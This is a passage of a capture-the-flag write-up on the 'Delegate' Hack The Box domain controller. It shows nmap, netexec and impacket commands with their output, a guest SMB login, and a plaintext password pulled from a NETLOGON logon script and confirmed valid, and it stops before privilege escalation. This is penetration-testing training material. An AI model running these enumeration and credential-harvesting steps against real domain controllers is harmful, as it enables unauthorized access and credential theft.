# Delegate-HTB
Lot'sa tips here for privesc in domain controllers 

Innitial Nmap report:
````
└─$ cat nmap_report.txt
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 19:26 -0300
Nmap scan report for 10.129.234.69
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-18 22:26:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-18T22:28:05+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-11-17T13:52:45
|_Not valid after:  2027-05-19T13:52:45
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-18T22:27:45+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
52065/tcp open  msrpc         Microsoft Windows RPC
53234/tcp open  msrpc         Microsoft Windows RPC
53813/tcp open  msrpc         Microsoft Windows RPC
60705/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60706/tcp open  msrpc         Microsoft Windows RPC
60711/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-18T22:27:48
|_  start_date: N/A

TRACEROUTE (using port 53234/tcp)
HOP RTT       ADDRESS
1   327.92 ms 10.10.16.1
2   330.68 ms 10.129.234.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.54 seconds
````
Innitial nmap report is done. The domain name is: dc1.delegate.vl. Let's enum smb as guest via netexec:
````
└─$ netexec smb 10.129.234.69 -u 'guest' -p ''
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
````
Let's see the shares we have access as guest:
````
└─$ impacket-smbclient -no-pass guest@10.129.234.69
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share 
SYSVOL                    DISK            Logon server share 
# use NETLOGON
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Sun Oct  1 06:08:32 2023 .
drw-rw-rw-          0  Sun Oct  1 06:08:32 2023 ..
-rw-rw-rw-        159  Sun Oct  1 06:08:32 2023 users.bat
````

Inside users.bat we find credentials for A.Briggs:
````
└─$ cat users.bat      
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123 
````

I tried connecting via evil-winrm, but i had no success:
````
└─$ evil-winrm -i delegate.vl -u a.briggs -p P4ssw0rd1#123
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Error: Cannot establish connection to remote endpoint. Check credentials and network.
                                        
Error: WinRM::WinRMAuthorizationError: WinRM::WinRMAuthorizationError
````
Let's check if they are valid credentials:
````
└─$ netexec smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
````





